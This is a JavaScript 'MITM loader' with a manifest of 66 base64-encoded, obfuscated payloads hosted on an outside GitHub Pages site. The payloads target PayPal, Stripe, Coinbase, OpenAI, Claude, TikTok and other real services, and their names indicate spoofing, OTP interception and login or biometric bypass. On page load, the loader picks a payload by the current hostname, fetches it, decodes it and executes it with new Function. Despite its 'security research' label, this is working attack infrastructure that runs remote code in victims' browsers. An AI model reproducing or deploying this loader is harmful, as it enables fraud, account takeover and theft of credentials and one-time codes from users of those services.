// == Enhanced MITM Loader - Security Research Edition ==
// Generated: 2025-09-02T01:17:40.990Z
// Payloads: 66
// Auto-injected from obfuscated pipeline

(function() {
  'use strict';
  
  const PAYLOADS = {
  "openai_spoof_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/ai/openai-spoof-obfuscated.js.b64",
    "size": 30940,
    "hash": "ea62bde257664cec",
    "hostnames": [
      "openai.com",
      "chatgpt.com"
    ],
    "metadata": {
      "integrity": "ea62bde257664cec",
      "size": 30940,
      "encoded": true
    }
  },
  "openai_spoof.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/ai/openai-spoof.js.b64",
    "size": 3272,
    "hash": "e9e3abf72622bf77",
    "hostnames": [
      "openai.com",
      "chatgpt.com"
    ],
    "metadata": {
      "integrity": "e9e3abf72622bf77",
      "size": 3272,
      "encoded": true
    }
  },
  "biometric_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/auth/biometric-obfuscated.js.b64",
    "size": 27056,
    "hash": "e6232171ac07e5cb",
    "hostnames": [],
    "metadata": {
      "integrity": "e6232171ac07e5cb",
      "size": 27056,
      "encoded": true
    }
  },
  "biometric.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/auth/biometric.js.b64",
    "size": 2828,
    "hash": "987f40bc4ca4eb83",
    "hostnames": [],
    "metadata": {
      "integrity": "987f40bc4ca4eb83",
      "size": 2828,
      "encoded": true
    }
  },
  "fingerprint_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/device/fingerprint-obfuscated.js.b64",
    "size": 28396,
    "hash": "2a73c72a02026d24",
    "hostnames": [],
    "metadata": {
      "integrity": "2a73c72a02026d24",
      "size": 28396,
      "encoded": true
    }
  },
  "fingerprint.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/device/fingerprint.js.b64",
    "size": 3112,
    "hash": "e5f720f3dfa390bf",
    "hostnames": [],
    "metadata": {
      "integrity": "e5f720f3dfa390bf",
      "size": 3112,
      "encoded": true
    }
  },
  "moonpay_confirm_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/finance/moonpay_confirm-obfuscated.js.b64",
    "size": 28796,
    "hash": "026f1296f48e32fc",
    "hostnames": [
      "moonpay.com"
    ],
    "metadata": {
      "integrity": "026f1296f48e32fc",
      "size": 28796,
      "encoded": true
    }
  },
  "moonpay_confirm.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/finance/moonpay_confirm.js.b64",
    "size": 2864,
    "hash": "d1120ffca1e30fb3",
    "hostnames": [
      "moonpay.com"
    ],
    "metadata": {
      "integrity": "d1120ffca1e30fb3",
      "size": 2864,
      "encoded": true
    }
  },
  "paypal_spoof_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/finance/paypal-spoof-obfuscated.js.b64",
    "size": 34648,
    "hash": "c1c792721bd31ba3",
    "hostnames": [
      "paypal.com",
      "paypalobjects.com"
    ],
    "metadata": {
      "integrity": "c1c792721bd31ba3",
      "size": 34648,
      "encoded": true
    }
  },
  "paypal_spoof.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/finance/paypal-spoof.js.b64",
    "size": 3188,
    "hash": "7cc859ca6f1a3cf9",
    "hostnames": [
      "paypal.com",
      "paypalobjects.com"
    ],
    "metadata": {
      "integrity": "7cc859ca6f1a3cf9",
      "size": 3188,
      "encoded": true
    }
  },
  "stripe_radar_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/finance/stripe_radar-obfuscated.js.b64",
    "size": 25352,
    "hash": "7845d855c9c10326",
    "hostnames": [
      "stripe.com",
      "js.stripe.com"
    ],
    "metadata": {
      "integrity": "7845d855c9c10326",
      "size": 25352,
      "encoded": true
    }
  },
  "stripe_radar.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/finance/stripe_radar.js.b64",
    "size": 2928,
    "hash": "56717601948e4a6a",
    "hostnames": [
      "stripe.com",
      "js.stripe.com"
    ],
    "metadata": {
      "integrity": "56717601948e4a6a",
      "size": 2928,
      "encoded": true
    }
  },
  "wallets_spoof_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/finance/wallets-spoof-obfuscated.js.b64",
    "size": 34320,
    "hash": "b9a8b76dde350bcd",
    "hostnames": [],
    "metadata": {
      "integrity": "b9a8b76dde350bcd",
      "size": 34320,
      "encoded": true
    }
  },
  "wallets_spoof.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/finance/wallets-spoof.js.b64",
    "size": 3056,
    "hash": "696c88eed73bb87c",
    "hostnames": [],
    "metadata": {
      "integrity": "696c88eed73bb87c",
      "size": 3056,
      "encoded": true
    }
  },
  "geofence_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/location/geofence-obfuscated.js.b64",
    "size": 37084,
    "hash": "44c249df6d162504",
    "hostnames": [],
    "metadata": {
      "integrity": "44c249df6d162504",
      "size": 37084,
      "encoded": true
    }
  },
  "geofence.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/location/geofence.js.b64",
    "size": 2928,
    "hash": "e27fca10698a6f18",
    "hostnames": [],
    "metadata": {
      "integrity": "e27fca10698a6f18",
      "size": 2928,
      "encoded": true
    }
  },
  "typecloak_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/network/typecloak-obfuscated.js.b64",
    "size": 33304,
    "hash": "8d5a2aeb81968358",
    "hostnames": [],
    "metadata": {
      "integrity": "8d5a2aeb81968358",
      "size": 33304,
      "encoded": true
    }
  },
  "typecloak.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/network/typecloak.js.b64",
    "size": 2944,
    "hash": "7e43191f6db3ecc3",
    "hostnames": [],
    "metadata": {
      "integrity": "7e43191f6db3ecc3",
      "size": 2944,
      "encoded": true
    }
  },
  "rotate_cookies_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/rotate-cookies-obfuscated.js.b64",
    "size": 30920,
    "hash": "8ffe2b3dfd42e316",
    "hostnames": [],
    "metadata": {
      "integrity": "8ffe2b3dfd42e316",
      "size": 30920,
      "encoded": true
    }
  },
  "rotate_cookies.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/rotate-cookies.js.b64",
    "size": 4548,
    "hash": "15d56cfb0faac384",
    "hostnames": [],
    "metadata": {
      "integrity": "15d56cfb0faac384",
      "size": 4548,
      "encoded": true
    }
  },
  "rotate_headers_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/rotate-headers-obfuscated.js.b64",
    "size": 35840,
    "hash": "199ecd10b0ec84b4",
    "hostnames": [],
    "metadata": {
      "integrity": "199ecd10b0ec84b4",
      "size": 35840,
      "encoded": true
    }
  },
  "rotate_headers.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/rotate-headers.js.b64",
    "size": 5240,
    "hash": "d386a4a0e6e4dc65",
    "hostnames": [],
    "metadata": {
      "integrity": "d386a4a0e6e4dc65",
      "size": 5240,
      "encoded": true
    }
  },
  "rotate_tokens_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/rotate-tokens-obfuscated.js.b64",
    "size": 35608,
    "hash": "e18c6503c9d34a38",
    "hostnames": [],
    "metadata": {
      "integrity": "e18c6503c9d34a38",
      "size": 35608,
      "encoded": true
    }
  },
  "rotate_tokens.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/rotate-tokens.js.b64",
    "size": 4408,
    "hash": "5f293f3ec52f63e7",
    "hostnames": [],
    "metadata": {
      "integrity": "5f293f3ec52f63e7",
      "size": 4408,
      "encoded": true
    }
  },
  "amazon_spoof_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/amazon-spoof-obfuscated.js.b64",
    "size": 36316,
    "hash": "3bf9a27cdbe7fc07",
    "hostnames": [
      "amazon.com"
    ],
    "metadata": {
      "integrity": "3bf9a27cdbe7fc07",
      "size": 36316,
      "encoded": true
    }
  },
  "amazon_spoof.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/amazon-spoof.js.b64",
    "size": 2952,
    "hash": "925bda75c0f6b3b0",
    "hostnames": [
      "amazon.com"
    ],
    "metadata": {
      "integrity": "925bda75c0f6b3b0",
      "size": 2952,
      "encoded": true
    }
  },
  "claude_spoof_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/claude-spoof-obfuscated.js.b64",
    "size": 32204,
    "hash": "89beed645c70a945",
    "hostnames": [
      "claude.ai",
      "anthropic.com"
    ],
    "metadata": {
      "integrity": "89beed645c70a945",
      "size": 32204,
      "encoded": true
    }
  },
  "claude_spoof.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/claude-spoof.js.b64",
    "size": 3824,
    "hash": "e9f3fecb1f8a46e9",
    "hostnames": [
      "claude.ai",
      "anthropic.com"
    ],
    "metadata": {
      "integrity": "e9f3fecb1f8a46e9",
      "size": 3824,
      "encoded": true
    }
  },
  "coinbase_spoof_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/coinbase-spoof-obfuscated.js.b64",
    "size": 27548,
    "hash": "1d456d92203f9afb",
    "hostnames": [
      "coinbase.com"
    ],
    "metadata": {
      "integrity": "1d456d92203f9afb",
      "size": 27548,
      "encoded": true
    }
  },
  "coinbase_spoof.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/coinbase-spoof.js.b64",
    "size": 3068,
    "hash": "7ce73924a4dd95df",
    "hostnames": [
      "coinbase.com"
    ],
    "metadata": {
      "integrity": "7ce73924a4dd95df",
      "size": 3068,
      "encoded": true
    }
  },
  "faceid_pass_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/faceid-pass-obfuscated.js.b64",
    "size": 29380,
    "hash": "631800630ac07ad0",
    "hostnames": [],
    "metadata": {
      "integrity": "631800630ac07ad0",
      "size": 29380,
      "encoded": true
    }
  },
  "faceid_pass.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/faceid-pass.js.b64",
    "size": 3172,
    "hash": "0d33e29a971f8eb2",
    "hostnames": [],
    "metadata": {
      "integrity": "0d33e29a971f8eb2",
      "size": 3172,
      "encoded": true
    }
  },
  "location_fence_bypass_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/location-fence-bypass-obfuscated.js.b64",
    "size": 29416,
    "hash": "dfb65bb0445a7f51",
    "hostnames": [],
    "metadata": {
      "integrity": "dfb65bb0445a7f51",
      "size": 29416,
      "encoded": true
    }
  },
  "location_fence_bypass.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/location-fence-bypass.js.b64",
    "size": 2828,
    "hash": "dbccc1f138312568",
    "hostnames": [],
    "metadata": {
      "integrity": "dbccc1f138312568",
      "size": 2828,
      "encoded": true
    }
  },
  "old_device_fingerprint_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/old-device-fingerprint-obfuscated.js.b64",
    "size": 35476,
    "hash": "451bb2dc878ae7e5",
    "hostnames": [],
    "metadata": {
      "integrity": "451bb2dc878ae7e5",
      "size": 35476,
      "encoded": true
    }
  },
  "old_device_fingerprint.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/old-device-fingerprint.js.b64",
    "size": 3088,
    "hash": "0d4f0a444a442b7a",
    "hostnames": [],
    "metadata": {
      "integrity": "0d4f0a444a442b7a",
      "size": 3088,
      "encoded": true
    }
  },
  "otp_intercept_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/otp-intercept-obfuscated.js.b64",
    "size": 37236,
    "hash": "b42e08f19c6a61ea",
    "hostnames": [],
    "metadata": {
      "integrity": "b42e08f19c6a61ea",
      "size": 37236,
      "encoded": true
    }
  },
  "otp_intercept.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/otp-intercept.js.b64",
    "size": 3024,
    "hash": "4ebd472c9170cd36",
    "hostnames": [],
    "metadata": {
      "integrity": "4ebd472c9170cd36",
      "size": 3024,
      "encoded": true
    }
  },
  "rotate_ip_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/rotate-ip-obfuscated.js.b64",
    "size": 30368,
    "hash": "a1c82f3c4d181abc",
    "hostnames": [],
    "metadata": {
      "integrity": "a1c82f3c4d181abc",
      "size": 30368,
      "encoded": true
    }
  },
  "rotate_ip.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/rotate-ip.js.b64",
    "size": 3116,
    "hash": "817abb09264c6244",
    "hostnames": [],
    "metadata": {
      "integrity": "817abb09264c6244",
      "size": 3116,
      "encoded": true
    }
  },
  "spoof_coinbase_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/spoof-coinbase-obfuscated.js.b64",
    "size": 35448,
    "hash": "2f4c0ae6662e57f4",
    "hostnames": [
      "coinbase.com"
    ],
    "metadata": {
      "integrity": "2f4c0ae6662e57f4",
      "size": 35448,
      "encoded": true
    }
  },
  "spoof_coinbase.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/spoof-coinbase.js.b64",
    "size": 2764,
    "hash": "c16acce6ab4148b1",
    "hostnames": [
      "coinbase.com"
    ],
    "metadata": {
      "integrity": "c16acce6ab4148b1",
      "size": 2764,
      "encoded": true
    }
  },
  "spoof_openai_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/spoof-openai-obfuscated.js.b64",
    "size": 29768,
    "hash": "773ddb7a8d537914",
    "hostnames": [
      "openai.com",
      "chatgpt.com"
    ],
    "metadata": {
      "integrity": "773ddb7a8d537914",
      "size": 29768,
      "encoded": true
    }
  },
  "spoof_openai.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/spoof-openai.js.b64",
    "size": 3084,
    "hash": "3f6c809dd6efb90b",
    "hostnames": [
      "openai.com",
      "chatgpt.com"
    ],
    "metadata": {
      "integrity": "3f6c809dd6efb90b",
      "size": 3084,
      "encoded": true
    }
  },
  "spoof_stripe_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/spoof-stripe-obfuscated.js.b64",
    "size": 30044,
    "hash": "016b815f2b78b5f5",
    "hostnames": [
      "stripe.com",
      "js.stripe.com"
    ],
    "metadata": {
      "integrity": "016b815f2b78b5f5",
      "size": 30044,
      "encoded": true
    }
  },
  "spoof_stripe.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/spoof-stripe.js.b64",
    "size": 2760,
    "hash": "12ad3f1e258433b7",
    "hostnames": [
      "stripe.com",
      "js.stripe.com"
    ],
    "metadata": {
      "integrity": "12ad3f1e258433b7",
      "size": 2760,
      "encoded": true
    }
  },
  "spoof_textnow_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/spoof-textnow-obfuscated.js.b64",
    "size": 35328,
    "hash": "42b4c15abe9368b1",
    "hostnames": [
      "textnow.com",
      "textnowapi.com"
    ],
    "metadata": {
      "integrity": "42b4c15abe9368b1",
      "size": 35328,
      "encoded": true
    }
  },
  "spoof_textnow.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/spoof-textnow.js.b64",
    "size": 2976,
    "hash": "9818582da478e84f",
    "hostnames": [
      "textnow.com",
      "textnowapi.com"
    ],
    "metadata": {
      "integrity": "9818582da478e84f",
      "size": 2976,
      "encoded": true
    }
  },
  "stripe_radar_spoof_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/stripe-radar-spoof-obfuscated.js.b64",
    "size": 33212,
    "hash": "ffe91d6abf340323",
    "hostnames": [
      "stripe.com",
      "js.stripe.com"
    ],
    "metadata": {
      "integrity": "ffe91d6abf340323",
      "size": 33212,
      "encoded": true
    }
  },
  "stripe_radar_spoof.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/stripe-radar-spoof.js.b64",
    "size": 3336,
    "hash": "7270ca2f14212838",
    "hostnames": [
      "stripe.com",
      "js.stripe.com"
    ],
    "metadata": {
      "integrity": "7270ca2f14212838",
      "size": 3336,
      "encoded": true
    }
  },
  "tiktok_login_bypass_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/tiktok-login-bypass-obfuscated.js.b64",
    "size": 27140,
    "hash": "4709c236795f145d",
    "hostnames": [
      "tiktok.com"
    ],
    "metadata": {
      "integrity": "4709c236795f145d",
      "size": 27140,
      "encoded": true
    }
  },
  "tiktok_login_bypass.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/tiktok-login-bypass.js.b64",
    "size": 3192,
    "hash": "dc201053f4f95d99",
    "hostnames": [
      "tiktok.com"
    ],
    "metadata": {
      "integrity": "dc201053f4f95d99",
      "size": 3192,
      "encoded": true
    }
  },
  "voice_ai_bypass_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/voice-ai-bypass-obfuscated.js.b64",
    "size": 29840,
    "hash": "d36a59f8b4e27a69",
    "hostnames": [],
    "metadata": {
      "integrity": "d36a59f8b4e27a69",
      "size": 29840,
      "encoded": true
    }
  },
  "voice_ai_bypass.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/voice-ai-bypass.js.b64",
    "size": 3136,
    "hash": "e5ec6f1c018541d7",
    "hostnames": [],
    "metadata": {
      "integrity": "e5ec6f1c018541d7",
      "size": 3136,
      "encoded": true
    }
  },
  "wise_spoof_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/wise-spoof-obfuscated.js.b64",
    "size": 32820,
    "hash": "1b5323e6d5c8953d",
    "hostnames": [
      "wise.com"
    ],
    "metadata": {
      "integrity": "1b5323e6d5c8953d",
      "size": 32820,
      "encoded": true
    }
  },
  "wise_spoof.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/scripts/wise-spoof.js.b64",
    "size": 3268,
    "hash": "f1ff73cf4df9761e",
    "hostnames": [
      "wise.com"
    ],
    "metadata": {
      "integrity": "f1ff73cf4df9761e",
      "size": 3268,
      "encoded": true
    }
  },
  "captcha_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/security/captcha-obfuscated.js.b64",
    "size": 29736,
    "hash": "90eb1cf0c8a2150f",
    "hostnames": [],
    "metadata": {
      "integrity": "90eb1cf0c8a2150f",
      "size": 29736,
      "encoded": true
    }
  },
  "captcha.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/security/captcha.js.b64",
    "size": 2984,
    "hash": "fb57b319669bc0bc",
    "hostnames": [],
    "metadata": {
      "integrity": "fb57b319669bc0bc",
      "size": 2984,
      "encoded": true
    }
  },
  "otp_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/security/otp-obfuscated.js.b64",
    "size": 28376,
    "hash": "5a55076bf6a36285",
    "hostnames": [],
    "metadata": {
      "integrity": "5a55076bf6a36285",
      "size": 28376,
      "encoded": true
    }
  },
  "otp.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/security/otp.js.b64",
    "size": 2828,
    "hash": "79b70f38ed1c8ef6",
    "hostnames": [],
    "metadata": {
      "integrity": "79b70f38ed1c8ef6",
      "size": 2828,
      "encoded": true
    }
  },
  "instagram_shadowban_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/social/instagram_shadowban-obfuscated.js.b64",
    "size": 39420,
    "hash": "2f95b4bb5019f3ba",
    "hostnames": [
      "instagram.com"
    ],
    "metadata": {
      "integrity": "2f95b4bb5019f3ba",
      "size": 39420,
      "encoded": true
    }
  },
  "instagram_shadowban.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/social/instagram_shadowban.js.b64",
    "size": 7068,
    "hash": "451e151c8762857b",
    "hostnames": [
      "instagram.com"
    ],
    "metadata": {
      "integrity": "451e151c8762857b",
      "size": 7068,
      "encoded": true
    }
  },
  "tiktok_spoof_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/social/tiktok-spoof-obfuscated.js.b64",
    "size": 42064,
    "hash": "1d2ddb19ac55e07e",
    "hostnames": [
      "tiktok.com"
    ],
    "metadata": {
      "integrity": "1d2ddb19ac55e07e",
      "size": 42064,
      "encoded": true
    }
  },
  "tiktok_spoof.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/social/tiktok-spoof.js.b64",
    "size": 6468,
    "hash": "133479f60072d21e",
    "hostnames": [
      "tiktok.com"
    ],
    "metadata": {
      "integrity": "133479f60072d21e",
      "size": 6468,
      "encoded": true
    }
  },
  "tiktok_autologin_obfuscated.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/social/tiktok_autologin-obfuscated.js.b64",
    "size": 27764,
    "hash": "294b6101aef16a44",
    "hostnames": [
      "tiktok.com"
    ],
    "metadata": {
      "integrity": "294b6101aef16a44",
      "size": 27764,
      "encoded": true
    }
  },
  "tiktok_autologin.js": {
    "url": "https://popdeuxrem.github.io/shadow-scripts/obfuscated/obfuscated/social/tiktok_autologin.js.b64",
    "size": 2996,
    "hash": "d74c40cf03f0712d",
    "hostnames": [
      "tiktok.com"
    ],
    "metadata": {
      "integrity": "d74c40cf03f0712d",
      "size": 2996,
      "encoded": true
    }
  }
};
  
  // Security research context
  const RESEARCH_MODE = true;
  const DEBUG_ENABLED = window.location.search.includes('debug=1');
  
  function log(...args) {
    if (DEBUG_ENABLED) {
      console.log('[MITM-LOADER]', ...args);
    }
  }
  
  function logError(...args) {
    console.error('[MITM-LOADER]', ...args);
  }
  
  // Enhanced payload loading with integrity verification
  async function loadPayload(key, config) {
    const url = config.url;
    if (!url) {
      logError('No payload URL for key:', key);
      return false;
    }
    
    try {
      log('Loading payload:', key, 'from', url);
      
      const resp = await fetch(url, { 
        cache: 'no-cache',
        headers: {
          'X-Research-Mode': 'true'
        }
      });
      
      if (!resp.ok) throw new Error(`HTTP ${resp.status}: ${resp.statusText}`);
      
      const b64Content = await resp.text();
      
      // Verify integrity if available
      if (config.metadata?.integrity) {
        const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(b64Content));
        const hashArray = Array.from(new Uint8Array(hash));
        const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        
        if (!config.metadata.integrity.startsWith(hashHex.substring(0, 16))) {
          throw new Error('Integrity verification failed');
        }
        
        log('Integrity verified for payload:', key);
      }
      
      // Decode and execute
      const jsCode = atob(b64Content);
      
      // Execute in isolated scope for security research
      const executePayload = new Function('window', 'document', 'location', 'navigator', jsCode);
      executePayload(window, document, location, navigator);
      
      log('Successfully loaded and executed payload:', key);
      return true;
      
    } catch (err) {
      logError('Failed to load payload', key + ':', err.message);
      return false;
    }
  }
  
  // Intelligent hostname-based payload selection
  function selectPayloadForHost(hostname) {
    log('Selecting payload for hostname:', hostname);
    
    // First, try exact hostname matches
    for (const [key, config] of Object.entries(PAYLOADS)) {
      if (config.hostnames && config.hostnames.some(h => hostname === h || hostname.endsWith('.' + h))) {
        log('Found exact match:', key, 'for', hostname);
        return { key, config };
      }
    }
    
    // Then try partial matches
    for (const [key, config] of Object.entries(PAYLOADS)) {
      if (config.hostnames && config.hostnames.some(h => hostname.includes(h.split('.')[0]))) {
        log('Found partial match:', key, 'for', hostname);
        return { key, config };
      }
    }
    
    // Finally, try key-based matching (legacy)
    for (const [key, config] of Object.entries(PAYLOADS)) {
      if (hostname.includes(key.replace(/_/g, ''))) {
        log('Found legacy key match:', key, 'for', hostname);
        return { key, config };
      }
    }
    
    return null;
  }
  
  // Initialize MITM loader
  async function initialize() {
    const hostname = location.hostname.toLowerCase();
    log('MITM Loader initialized for hostname:', hostname);
    log('Available payloads:', Object.keys(PAYLOADS));
    
    const selection = selectPayloadForHost(hostname);
    
    if (selection) {
      log('Selected payload:', selection.key);
      await loadPayload(selection.key, selection.config);
    } else {
      log('No matching payload found for hostname:', hostname);
    }
  }
  
  // Auto-initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize);
  } else {
    initialize();
  }
  
  // Export for manual control in research scenarios
  if (RESEARCH_MODE) {
    window.MITMLoader = {
      payloads: PAYLOADS,
      loadPayload: loadPayload,
      selectPayload: selectPayloadForHost,
      initialize: initialize
    };
  }
  
})();